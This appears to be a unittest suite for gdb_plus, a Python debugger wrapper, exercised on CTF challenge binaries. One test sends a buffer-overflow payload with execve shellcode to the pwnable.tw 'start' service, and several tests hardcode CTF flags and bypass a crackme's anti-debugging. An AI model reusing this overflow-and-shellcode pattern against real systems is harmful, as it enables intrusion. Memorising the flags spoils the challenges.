import unittest
from gdb_plus import *
import warnings
import timeout_decorator

gdbinit_native = """
set pagination off
"""

gdbinit_gef = """
source ~/.gdbinit-gef.py
"""

gdbinit_pwndbg = """
source ~/.pwndbg/gdbinit.py
"""

QUICK = 10
MEDIUM = 30
LONG = 60

#@unittest.skip
class Debugger_process(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)
        warnings.simplefilter("ignore", ImportWarning)
        
    def tearDown(self):
        pass

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_file_standard(self):
        print("\ntest_file_standard: ", end="")
        with context.local(arch="i386", bits=32):
            with Debugger("./start").remote("chall.pwnable.tw", 10000) as dbg:
                dbg.c(wait=False)
                self.assertEqual(dbg.recv(), b"Let's start the CTF:")
                dbg.interrupt()
                self.assertEqual(dbg.instruction_pointer - dbg.elf.address, 0x99)
            
    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_noptrace(self):
        print("\ntest_noptrace: ", end="")
        with context.local(noptrace = True, arch="i386", bits=32):
            with Debugger("./start").remote("chall.pwnable.tw", 10000) as dbg:
                self.assertEqual(dbg.recv(), b"Let's start the CTF:")
                self.assertFalse(dbg.gdb) 
            
    #@unittest.skip
    @timeout_decorator.timeout(MEDIUM)
    def test_remote(self):
        print("\ntest_remote: ", end="")
        with context.local(arch="i386", bits=32):
            args.REMOTE = True
            with Debugger("./start").remote("chall.pwnable.tw", 10000) as dbg:
                args.REMOTE = ""
                shellcode = b"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xC9\x31\xD2\xcd\x80"
                dbg.p.recv()
                dbg.p.send(b"\x90" * 0x14 + p32(0x804808b))
                dbg.p.recv(0x18)
                leak = unpack(dbg.p.recv(4))
                offset = 0xffb49d00 - 0xffb49ce4
                stack = leak - offset
                dbg.p.recv()
                dbg.p.send(shellcode.ljust(0x2c, b'\x90') + p32(stack))
                dbg.p.sendline(b"cat /home/start/flag")
                self.assertEqual(dbg.p.recv().strip(), b"FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}")

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_process(self):
        print("\ntest_process: ", end="")
        with context.local(arch="i386", bits=32):
            p = process("./start")
            with Debugger(p) as dbg:
                self.assertEqual(dbg.p.recv(), b"Let's start the CTF:")
            
    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_pid(self):
        print("\ntest_pid: ", end="")
        with context.local(arch="i386", bits=32):
            p = process("./start")
            self.assertEqual(type(p.pid), int)
            dbg = Debugger(p.pid, binary="./start")
            dbg.close()

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_debug_from(self):
        print("\ntest_debug_from: ", end="")
        with context.local(arch="amd64", bits=64):
            with Debugger("./traps_withSymbols", aslr=False, debug_from=0x0401590, timeout=0.4) as dbg:
                self.assertEqual(dbg.rip, 0x0401590)
            
    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_nonblocking_debug_from(self):
        print("\ntest_nonblocking_debug_from: ", end="")
        with context.local(arch="i386", bits=32):
            interaction_finished = Event()
            with Debugger("./start", aslr=False).debug_from(0x804809d, event=interaction_finished, timeout=0.01) as dbg:
                dbg.p.sendline(b"ciao")
                interaction_finished.set()
                dbg.debug_from_done.wait()
                self.assertEqual(dbg.eip, 0x804809d)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_multiple_breakpoints(self):
        print("\ntest_multiple_breakpoints: ", end="")
        with context.local(arch="amd64", bits=64):
            with Debugger("./traps_withSymbols", aslr=False) as dbg:
                dbg.until(0x401581)
                callback_finished = []
                def callback(dbg):
                    dbg.finish()
                    callback_finished.append(dbg.instruction_pointer)
                    return False
                dbg.b(0x433494, callback=callback)
                dbg.next()		
                self.assertEqual(callback_finished[0], 0x401586)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_close_breakpoints(self):
        print("\ntest_close_breakpoints: ", end="")
        with context.local(arch="amd64", bits=64):
            with Debugger("./traps_withSymbols", aslr=False) as dbg:
                dbg.b(0x401802)
                dbg.b(0x401801, callback=lambda x: False)
                dbg.c()
                self.assertEqual(dbg.rip, 0x401802)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_ltrace(self):
        print("\ntest_ltrace: ", end="")
        with context.local(binary = "./insaaaaaaane"):
            with Debugger("./insaaaaaaane") as dbg:
                dbg.set_ltrace()
                data = [0]
                def callback(self):
                    data[0] = self.args[1]
                    return False
                dbg.b(dbg.exe.plt["fgets"], callback=callback)
                dbg.p.sendline(b"ciao")
                dbg.c()
                self.assertEqual(data[0], 0x63)

#@unittest.skip
class Debugger_EXE(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)
        warnings.simplefilter("ignore", ImportWarning)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_libs_qemu(self):
        print("\ntest_libs_qemu: ", end="")
        with context.local(binary="./risky-business"):
            with Debugger(context.binary, aslr=False, from_entry=False, script=gdbinit_pwndbg) as dbg:
                self.assertTrue(dbg.instruction_pointer not in dbg.exe)
                self.assertTrue(dbg.instruction_pointer in dbg.ld)
                self.assertEqual(dbg.exe.address, 0x4000000000)
                self.assertEqual(dbg.exe.range, 0x3000)
                self.assertEqual(dbg.ld.address, 0x4001804000)
                self.assertEqual(dbg.ld.range, 0x23000)
                self.assertEqual(len(dbg.libs), 2)
                dbg.until(dbg.elf.entry)
                self.assertEqual(len(dbg.libs), 3)
                self.assertEqual(dbg.libc.address, 0x4001851000)
                self.assertEqual(dbg.libc.range, 0x127000)
                self.assertTrue(dbg.instruction_pointer in dbg.exe)
                self.assertTrue(dbg.instruction_pointer not in dbg.libc)
                self.assertTrue(dbg.instruction_pointer not in dbg.ld)
                dbg.until("fgets")
                self.assertTrue(dbg.instruction_pointer not in dbg.exe)
                self.assertTrue(dbg.instruction_pointer in dbg.libc)
                self.assertTrue(dbg.instruction_pointer not in dbg.ld)
    
    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_additional_libraries(self):
        print("\ntest_additional_libraries: ", end="")
        with context.local(binary="./deflation"):
            with Debugger(context.binary, aslr=False, from_entry=True) as dbg:
                dbg.access_library("libz")
                self.assertEqual(dbg.libz.address, 0x7ffff7f76000)

#@unittest.skip
class Debugger_actions(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)
        warnings.simplefilter("ignore", ImportWarning)

    def tearDown(self):
        pass

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_continue_until(self):
        print("\ntest_continue_until: ", end="")
        with context.local(arch="amd64", bits=64):
            with Debugger("./insaaaaaaane") as dbg:
                dbg.b(0x403ad7, temporary=True)
                print("\nPlay with gdb once we hit address 0x403ad7 and then send continue")
                # Possible bug: If I hit the breakpoint too soon it won't detect it... 
                dbg.continue_until(0x403adb)
                self.assertEqual(dbg.instruction_pointer, 0x403adb)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_nonblocking_continue_until(self):
        print("\ntest_nonblocking_continue_until: ", end="")
        with context.local(arch="amd64", bits=64):
            with Debugger("./insaaaaaaane") as dbg:
                done = dbg.continue_until(0x4038c2, wait=False)
                dbg.p.sendline(b"ciao")
                done.wait()
                self.assertEqual(dbg.instruction_pointer, 0x4038c2)

#@unittest.skip
class Debugger_callbacks(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)

    def tearDown(self):
        pass	
            

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_read_memory(self):
        print("\ntest_read_memory: ", end="")
        
        data = []

        def callback(dbg):
            dbg.push(dbg.rsi)
            data.append(u64(dbg.read(dbg.rsp, 8)) != dbg.rsi)
            dbg.rsi = dbg.pop()
            return True
            
        with context.local(arch="amd64", bits=64):	
            with Debugger("./insaaaaaaane") as dbg:
                dbg.b(0x400786, callback=callback, temporary=True)
                dbg.c(wait=True)
                self.assertFalse(sum(data))

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_no_stop(self):
        print("\ntest_no_stop: ", end="")
        def callback(dbg):
            dbg.b(0x403ad9, temporary=True)
            return False

        with context.local(arch="amd64", bits=64):
            with Debugger("./insaaaaaaane") as dbg:
                dbg.b(0x403ad0, callback=callback, temporary=True)
                
                dbg.c(wait=True)
                #dbg.interactive()
                self.assertEqual(dbg.rip, 0x403ad9)
                self.assertFalse(len(dbg.breakpoints[0x403ad0] + dbg.breakpoints[0x403ad9]))
                self.assertFalse(dbg.priority)

    # It works, but it should finish with priority 0, not 1
    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_step(self):
        print("\ntest_step: ", end="")

        def callback(dbg):
            dbg.step()
            return True

        with context.local(arch="amd64", bits=64):
            with Debugger("./insaaaaaaane") as dbg:
                dbg.b(0x403ad0, callback=callback, temporary=True)
                dbg.c(wait=True)
                self.assertEqual(dbg.rip, 0x403ad2)
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_enforce_stop(self):
        print("\ntest_enforce_stop: ", end="")

        def callback(dbg):
            dbg.finish()
            return False

        with context.local(arch="amd64", bits=64):
            with Debugger("./insaaaaaaane") as dbg:
                dbg.b(0x400870, callback=callback)
                #dbg.b(0x40388e)
                #dbg.c(wait=True)
                dbg.until(0x40388e)
                self.assertEqual(dbg.rip, 0x40388e)
                self.assertFalse(dbg.priority)

#@unittest.skip
class Debugger_catchpoint(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)

    def tearDown(self):
        pass	
    
    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_manual_load_libc(self):
        print("\ntest_manual_load_libc: ", end="")
        with context.local(binary = ELF("./cube")):
            with Debugger("./cube", from_start = True, from_entry = False) as dbg:
                self.assertTrue(dbg.libc is None)
                dbg.catch("load")
                dbg.c()
                self.assertTrue(dbg.libc is not None)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_load_libc(self):
        print("\ntest_load_libc: ", end="")
        with context.local(binary = ELF("./cube")):
            with Debugger("./cube", from_start = True, from_entry = False) as dbg:
                self.assertTrue(dbg.libc is None)
                dbg.load_libc()
                self.assertTrue(dbg.libc is not None)

    # The syscalls are tested in ptrace emulation

#@unittest.skip
class Debugger_memory(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)

    def tearDown(self):
        pass
        
    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_register_access(self):
        print("\ntest_register_access: ", end="")
        with context.local(binary = ELF("./cube")):
            with Debugger("./cube", aslr=False) as dbg:
                dbg.rax = 0xdeadbeefdeadbeef
                dbg.eax = 0xfafafafa
                dbg.ax  = 0xbabe
                dbg.ah = 0x90
                self.assertEqual(dbg.rax, 0xdeadbeeffafa90be)
                dbg.r11 = 0x134343432342
                self.assertEqual(dbg.r11, 0x134343432342)
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_special_registers(self):
        print("\ntest_special_registers: ", end="")
        with context.local(binary = ELF("./cube")):
            with Debugger("./cube", aslr=False) as dbg:
                self.assertEqual(dbg.return_value, dbg.rax)
                self.assertEqual(dbg.stack_pointer, dbg.rsp)
                self.assertEqual(dbg.instruction_pointer, dbg.rip)
                self.assertFalse(dbg.priority)

    # TODO: Test it with multiple inferiors if possible
    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_alloc(self):
        print("\ntest_alloc: ", end="")
        with context.local(binary = ELF("./cube")):
            with Debugger("./cube", aslr=False, script=gdbinit_gef) as dbg:
                assert dbg._gef, "run again with GEF"
                pointer = dbg.alloc(16)
                dbg.write(pointer, p64(0xdeadbeeffafa90be))
                self.assertTrue(hex(pointer) in dbg.execute("heap chunks")) # WARNING THIS ONLY WORKS WITH GEF
                dbg.dealloc(pointer)
                pointer = dbg.alloc(16, heap=False)
                dbg.write(pointer, p64(0xdeadbeeffafa90be))
                dbg.dealloc(pointer, len=16, heap=False)
                # remember dealloc in the bss will only delete the last chunk... 
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_writes(self):
        print("\ntest_writes: ", end="")
        with context.local(binary = ELF("./cube")):
            with Debugger("./cube", aslr=False) as dbg:
                ints = [4, 6, 295342, 23, 50032]
                strings = [b"ciao", b"come stai ?", b"questo programma fa davvero schifo"]
                pointer = dbg.write_ints(None, ints)
                self.assertEqual(ints, dbg.read_ints(pointer, len(ints)))
                dbg.write_ints(pointer, [x*2 for x in ints])
                self.assertEqual([x*2 for x in ints], dbg.read_ints(pointer, len(ints)))
                pointer = dbg.write_longs(None, ints)
                self.assertEqual(ints, dbg.read_longs(pointer, len(ints)))
                dbg.write_longs(pointer, [x*2 for x in ints])
                self.assertEqual([x*2 for x in ints], dbg.read_longs(pointer, len(ints)))
                pointer = dbg.write_int(None, ints[0])
                self.assertEqual(ints[0], dbg.read_int(pointer))
                pointer = dbg.write_strings(None, strings*100)
                self.assertEqual(strings*100, dbg.read_strings(pointer, len(strings)*100))
                pointer = dbg.write_string(None, strings[0])
                self.assertEqual(strings[0], dbg.read_string(pointer))		
                self.assertFalse(dbg.priority)

#@unittest.skip
class Debbuger_fork(unittest.TestCase):
    from base64 import b64encode
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)
        warnings.simplefilter("ignore", ImportWarning)

    def tearDown(self):
        pass

    @staticmethod
    def http_request(auth: bytes = b64encode(b"admin:admin"), keepAlive: bool = False):
        LINE_TERMINATOR =  b"\r\n"
        request = []
        request.append(b"GET / HTTP/1.1")
        request.append(b"authorization: Basic " + auth) 
        if keepAlive:
            request.append(b"Connection: keep-alive")
        else:
            request.append(b"Connection: close")
        return LINE_TERMINATOR.join(request + [b""])

    #@unittest.skip
    @timeout_decorator.timeout(MEDIUM)
    def test_continuous_follow(self):
        print("\ntest_continuous_follow: ", end="")
        gdbscript = """
        set detach-on-fork off
        set follow-fork-mode child
        """
        with context.local(binary = ELF("./httpd")):
            with Debugger("./httpd", aslr=False, script=gdbscript) as dbg:
                CALL_TO_B64DECODE = 0x26d5
                done = dbg.until(CALL_TO_B64DECODE, wait=False)
                dbg.p.sendline(self.http_request(keepAlive=True))
                done.wait()
                self.assertEqual(dbg.rip, 0x5555555566d5)
                dbg.c()
                dbg.execute("inferior 1") # We can't go back while the child is running
                done = dbg.until(CALL_TO_B64DECODE, wait=False)
                dbg.p.sendline(self.http_request(keepAlive=True))
                done.wait()
                self.assertEqual(dbg.rip, 0x5555555566d5)
                self.assertFalse(dbg.priority)
        
    # Priority not cleared
    #@unittest.skip
    @timeout_decorator.timeout(MEDIUM)
    def test_split(self):
        print("\ntest_split: ", end="")
        with context.local(arch = "amd64", bits = 64):
            CALL_TO_B64DECODE = 0x26d5
            # pwndbg changes the follow-fork-mode
            gdbscript = """
            set detach-on-fork off
            set follow-fork-mode parent
            """
            with Debugger("./httpd", aslr=False, script=gdbscript) as dbg:
                dbg.c(wait=False)
                sleep(1) # wait for the child to spwn. The parent will continue while the child is stopped at fork
                dbg.interrupt()
                sleep(1) # wait for the priority to get back to zero
                self.assertFalse(dbg.priority)
                dbg.b(CALL_TO_B64DECODE)
                child = dbg._split_child(n=2)
                dbg.p.sendline(self.http_request(keepAlive=True))
                child.b(CALL_TO_B64DECODE)
                child.c()
                self.assertEqual(child.rip, 0x5555555566d5)
                child.c()
                child.detach()
                dbg.execute("set follow-fork-mode child")
                dbg.p.sendline(self.http_request(keepAlive=True))
                dbg.c()
                sleep(1)
                self.assertEqual(dbg.rip, 0x5555555566d5)
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(MEDIUM)
    def test_my_split_interrupt(self):
        print("\ntest_my_split_interrupt: ", end="")
        with context.local(arch = 'amd64'):
            with Debugger("./traps_withSymbols", script="", aslr=False) as dbg:
                dbg.set_split_on_fork(interrupt=True)
                dbg.c(wait=False)
                pid = dbg.wait_split() # and then for the child to split out
                child = dbg.children[pid]
                sleep(0.5) # Wait for the priority to reach 0
                self.assertEqual(dbg.instruction_pointer, 0x432d37) # Now it stops perfectly on the syscall instruction
                self.assertEqual(child.instruction_pointer, 0x432d37)
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(MEDIUM)
    def test_my_split_breakpoint(self):
        print("\ntest_my_split_breakpoint: ", end="")
        with context.local(arch = 'amd64'):
            with Debugger("./traps_withSymbols", aslr=False) as dbg:
                dbg.set_split_on_fork(interrupt=False)
                dbg.until("fork")
                dbg.finish()
                pid = dbg.wait_split() # and then for the child to split out
                child = dbg.children[pid]
                #sleep(0.05) # Wait for the priority to reach 0
                self.assertEqual(dbg.instruction_pointer, 0x4025c0)
                self.assertEqual(child.instruction_pointer, 0x432d37)
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(LONG)
    def test_ptrace_emulation(self):
        print("\ntest_ptrace_emulation: ", end="")
        with context.local(arch = 'amd64'):
            ANTI_DEBUG_TEST_FINISHED = 0x0401590
            CALLED_MMAP = 0x0402520
            RWX_SECTION = 0x7ffff7ff8000
            END_UNPACK  = RWX_SECTION + 0x80
            SYSCALL_TRAP_PTRACE = RWX_SECTION + 0x9e
            with Debugger("./traps_withSymbols", aslr=False, debug_from=ANTI_DEBUG_TEST_FINISHED) as dbg:
                dbg.set_split_on_fork() 
                
                dbg.continue_until("fork")
                dbg.finish()
                pid = dbg.wait_split()
                
                child = dbg.children[pid]
                child.emulate_ptrace(silent=True)
                dbg.emulate_ptrace(silent=True)
                dbg.p.sendline(b"CSCG{4ND_4LL_0FF_TH1S_W0RK_JU5T_T0_G3T_TH1S_STUUUP1D_FL44G??!!1}")
                done = dbg.c(wait=False)
                
                child.continue_until(CALLED_MMAP)

                for i in range(1, 5):
                    child.continue_until(END_UNPACK, hw=True, loop=True)
                    
                # Sovrascrivi il return value di syscall(ptrace)
                child.continue_until(SYSCALL_TRAP_PTRACE, loop=True)
                # Interaggisce in modo strano con l'handler della syscall...
                child.step()
                child.return_value = 0x0

                child.c()
                self.assertTrue(b"YES !" in dbg.p.recv())
                self.assertFalse(child.priority)
                done.wait()
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(LONG * 4)
    def test_ptrace_emulation_syscall(self):
        print("\ntest_ptrace_emulation_syscall: ", end="")
        with context.local(arch = "amd64"):
            from sage.all import IntegerModRing, MatrixSpace, vector

            END_ANTI_TRACING = 0x0401590
            RWX_SECTION = 0x7ffff7ff8000
            CALLED_MMAP = 0x0402520
            END_UNPACK  = RWX_SECTION + 0x80
            TRAP_PTRACE = RWX_SECTION + 0x9e
            MATRIX_DATA = RWX_SECTION + 0xc2

            def parse_line(data: bytes):
                ans = []
                for i in range(0, 0x10):
                    ans.append(u32(data[i*4: (i+1)*4]))
                return ans

            with Debugger("./traps_withSymbols", aslr=False, debug_from=END_ANTI_TRACING) as dbg:
                return
                dbg.set_split_on_fork()

                dbg.continue_until("fork")
                dbg.finish()
                child_pid = dbg.wait_split()
                child = dbg.children[child_pid]
                child.emulate_ptrace(syscall=True, silent=True)

                A, b = [], []
                dbg.p.sendline(b"A"*0x40)
                dbg.emulate_ptrace(syscall=True, silent=True) 
                dbg.cont(wait=False)

                child.continue_until(CALLED_MMAP)

                for i in range(1, 21):
                    child.continue_until(END_UNPACK, hw=True, loop=True)
                    
                    #Tolgo questa parte perché dovrebbe essere gestita da emulate
                    # if i == 4:
                    #  child.continue_until(TRAP_PTRACE, loop=True)
                    #  child.step()
                    #  child.return_value = 0x0

                    if i in range(5, 5+0x10):
                        A.append(parse_line(child.read(MATRIX_DATA, 0x40)))
                        b.append(u32(child.read(MATRIX_DATA+ 0x40, 4)))

                R = IntegerModRing(2**32)
                M = MatrixSpace(R, 0x10, 0x10)
                A = M(A)
                b = vector(b)
                x = A.solve_right(b)
                flag = b""
                for n in x:
                    flag += p32(n)
                self.assertEqual(xor(flag, 0xd), b"CSCG{4ND_4LL_0FF_TH1S_W0RK_JU5T_T0_G3T_TH1S_STUUUP1D_FL44G??!!1}")

    #@unittest.skip
    @timeout_decorator.timeout(LONG)
    def test_ptrace_emulation_libdebug(self):
        print("\ntest_ptrace_emulation_libdebug: ", end="")
        with context.local(arch="amd64"):
            from sage.all import IntegerModRing, MatrixSpace, vector

            END_ANTI_TRACING = 0x0401590
            RWX_SECTION = 0x7ffff7ff8000
            CALLED_MMAP = 0x0402520
            END_UNPACK  = RWX_SECTION + 0x80
            TRAP_PTRACE = RWX_SECTION + 0x9e
            MATRIX_DATA = RWX_SECTION + 0xc2

            def parse_line(data: bytes):
                ans = []
                for i in range(0, 0x10):
                    ans.append(u32(data[i*4: (i+1)*4]))
                return ans

            # Fa attach dopo che il programma abbia controllato che non ci sia nessun debugger
            # Spawna un nuovo debugger ogni volta che il processo forka
            # Emula ptrace senza interrompere l'esecuzione
            with Debugger("./traps_withSymbols", aslr=False, debug_from=END_ANTI_TRACING) as dbg:
                dbg.set_split_on_fork()
                dbg.emulate_ptrace(silent=True) 

                # split children and parent
                dbg.continue_until("fork")
                dbg.finish()
                child_pid = dbg.wait_split()
                child = dbg.children[child_pid]
                child.emulate_ptrace(silent=True)

                A, b = [], []
                dbg.p.sendline(b"A"*0x40)
                
                # Perchè invertirli rompe tutto ?
                child.migrate(libdebug=True)
                dbg.migrate(libdebug=True)
                dbg.cont(wait=False)
                child.continue_until(CALLED_MMAP)

                for i in range(1, 21):
                    child.continue_until(END_UNPACK, hw=True, loop=True)
                    
                    # Sovrascrivi il return value di syscall(ptrace)
                    if i == 4:
                        child.continue_until(TRAP_PTRACE, loop=True)
                        child.step()
                        child.return_value = 0x0

                    # Dumpa i dati
                    if i in range(5, 5+0x10):
                        A.append(parse_line(child.read(MATRIX_DATA, 0x40)))
                        b.append(u32(child.read(MATRIX_DATA+ 0x40, 4)))

                # Risolvi sistema lineare con Sage
                R = IntegerModRing(2**32)
                M = MatrixSpace(R, 0x10, 0x10)
                A = M(A)
                b = vector(b)
                x = A.solve_right(b)
                flag = b""
                for n in x:
                    flag += p32(n)
                self.assertEqual(xor(flag, 0xd), b"CSCG{4ND_4LL_0FF_TH1S_W0RK_JU5T_T0_G3T_TH1S_STUUUP1D_FL44G??!!1}")

#@unittest.skip
class Debugger_signals(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)
        warnings.simplefilter("ignore", ImportWarning)
            

    def tearDown(self):
        pass
        
    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_signal_gdb(self):
        print("\ntest_signal_gdb: ", end="")
        from queue import Queue
        HANDLER_RET = 0x04011ff
        CHECK_CALL = 0x0401341
        with context.local(binary = ELF("./ExceptionalChecking_patched")):
            with Debugger("./ExceptionalChecking_patched") as dbg:
                dbg.p.sendline(b"serial_a_caso")
                dbg.until(CHECK_CALL)
                dbg.step()
                dbg.next_signal = False
                output = []
                def callback(dbg):
                    if dbg.next_signal:
                        #print("\ncall signal")
                        dbg.signal("SIGUSR1", handler=HANDLER_RET)
                        dbg.next_signal = False
                    ni = dbg.next_inst
                    if ni.mnemonic == "int3":
                        #print("\nint3")
                        dbg.next_signal = True
                        dbg.write(dbg.instruction_pointer, b"\x90") #Just to avoid problems
                    else:
                        output.append(ni.toString())
                n = dbg.step_until_ret(callback, limit=5)
                # We can't use condition because the callback is called after the step
                #dbg.step_until_condition(callback)
                self.assertEqual(n, -1)
                with open("dump_ExceptionalChecking") as fp:
                    self.assertTrue(fp.read().startswith("\n".join(output)))
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_signal_handler_libdebug(self):
        print("\ntest_signal_handler_libdebug: ", end="")
        from queue import Queue
        HANDLER_RET = 0x04011ff
        CHECK_CALL = 0x0401341
        with context.local(binary = ELF("./ExceptionalChecking_patched")):
            with Debugger("./ExceptionalChecking_patched") as dbg:
                dbg.migrate(libdebug=True)
                dbg.p.sendline(b"serial_a_caso")
                dbg.until(CHECK_CALL)
                dbg.step()
                dbg.next_signal = False
                output = []
                def callback(dbg):
                    if dbg.next_signal:
                        #print("\ncall signal")
                        dbg.signal("SIGUSR1", handler=HANDLER_RET)
                        dbg.next_signal = False
                    ni = dbg.next_inst
                    if ni.mnemonic == "int3":
                        #print("\nint3")
                        dbg.next_signal = True
                        dbg.write(dbg.instruction_pointer, b"\x90") #Just to avoid problems
                    else:
                        output.append(ni.toString())
                dbg.step_until_ret(callback, limit=50)
                with open("dump_ExceptionalChecking") as fp:
                    self.assertTrue(fp.read().startswith("\n".join(output)))
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_signal_hw_libdebug(self):
        print("\ntest_signal_hw_libdebug: ", end="")
        from queue import Queue
        CHECK_CALL = 0x0401341
        with context.local(binary = ELF("./ExceptionalChecking_patched")):
            with Debugger("./ExceptionalChecking_patched") as dbg:
                dbg.migrate(libdebug=True)
                dbg.p.sendline(b"serial_a_caso")
                dbg.until(CHECK_CALL)
                dbg.step()
                dbg.next_signal = False
                output = []
                def callback(dbg):
                    if dbg.next_signal:
                        #print("\ncall signal")
                        dbg.signal("SIGUSR1")
                        dbg.next_signal = False
                    ni = dbg.next_inst
                    if ni.mnemonic == "int3":
                        #print("\nint3")
                        dbg.next_signal = True
                        dbg.write(dbg.instruction_pointer, b"\x90") #Just to avoid problems
                    else:
                        output.append(ni.toString())
                dbg.step_until_ret(callback, limit=50)
                with open("dump_ExceptionalChecking") as fp:
                    self.assertTrue(fp.read().startswith("\n".join(output)))
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_signal_step(self):
        print("\ntest_signal_step: ", end="")
        CHECK_CALL = 0x0401341
        with context.local(binary = ELF("./ExceptionalChecking_patched")):
            with Debugger("./ExceptionalChecking_patched") as dbg:
                dbg.p.sendline(b"serial_a_caso")
                dbg.until(CHECK_CALL)
                dbg.step()
                dbg.next_signal = False
                dbg.si(repeat=2)
                dbg.signal("SIGUSR1", step=True)
                self.assertEqual(dbg.instruction_pointer, 0x401196)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_signal_step_libdebug(self):
        print("\ntest_signal_step_libdebug: ", end="")
        CHECK_CALL = 0x0401341
        with context.local(binary = ELF("./ExceptionalChecking_patched")):
            with Debugger("./ExceptionalChecking_patched") as dbg:
                dbg.p.sendline(b"serial_a_caso")
                dbg.until(CHECK_CALL)
                dbg.step()
                dbg.next_signal = False
                dbg.si(repeat=2)
                dbg.migrate(libdebug=True)
                dbg.signal("SIGUSR1", step=True)
                self.assertEqual(dbg.instruction_pointer, 0x401196)

#@unittest.skip
class Debugger_calls(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)
        warnings.simplefilter("ignore", ImportWarning)

    def tearDown(self):
        pass

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_call(self):
        print("\ntest_call: ", end="")
        out = []
        with context.local(binary = "./cube"):
            with Debugger("./cube", from_entry=True, aslr=False) as dbg: # You must wait for the libc to be loaded to call malloc
                for mossa in [0x00003175, 0x00003e74, 0x000038d9, 0x00001885]:
                    # Create blank cube
                    pointer = dbg.alloc(54*8)
                    dbg.write_longs(pointer, list(range(54)))
                    #for i in range(54):
                    #	dbg.write(pointer+i*8, p64(i))

                    dbg.call(mossa, [pointer])
                    out.append(f"prossima funzione {hex(dbg.elf.address + mossa)}")
                    for i, value in enumerate(dbg.read_longs(pointer, 54)):
                        out.append(f"{i}: {value}")
                #print("\n\n".join(out)) 
                with open("./dump_Cube") as fd:
                    self.assertEqual(out, fd.read().split("\n"))
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_syscall_64bit(self):
        print("\ntest_syscall: ", end="")
        path = "./data.txt"
        with context.local(arch="amd64", bits=64):
            with open(path, "wb") as file:
                file.write(b"")
            with Debugger("./insaaaaaaane", from_entry=True) as dbg: # You must wait for the libc to be loaded to call malloc
                fd = dbg.syscall(constants.SYS_open, [path, constants.O_WRONLY, 0x0])
                data = b"ciao, come stai ?"
                dbg.syscall(constants.SYS_write, [fd, data, len(data)])
                dbg.syscall(constants.SYS_close, [fd])
                with open(path, "rb") as file:
                    self.assertEqual(file.read(), data)
                self.assertFalse(dbg.priority)

#@unittest.skip
class Debugger_libdebug(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)
        warnings.simplefilter("ignore", ImportWarning)

    def tearDown(self):
        pass

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_migrate(self):
        print("\ntest_migrate: ", end="")
        with context.local(arch="amd64", bits=64):
            with Debugger("./httpd", aslr=False) as dbg:
                dbg.migrate(libdebug=True)
                self.assertEqual(dbg.instruction_pointer, 0x555555555440)
                dbg.step()
                self.assertEqual(dbg.instruction_pointer, 0x555555555444)
                dbg.migrate(gdb=True)
                self.assertEqual(dbg.instruction_pointer, 0x555555555444)
                dbg.step()
                self.assertEqual(dbg.instruction_pointer, 0x555555555446)
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_continue_until(self):
        print("\ntest_continue_until [libdebug]: ", end="")
        with context.local(arch="amd64", bits=64):
            with Debugger("./httpd", aslr=False) as dbg:
                dbg.migrate(libdebug=True)
                dbg.continue_until("main")
                self.assertEqual(dbg.instruction_pointer, 0x55555555570c)
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_call(self):
        print("\ntest_call [libdebug]: ", end="")
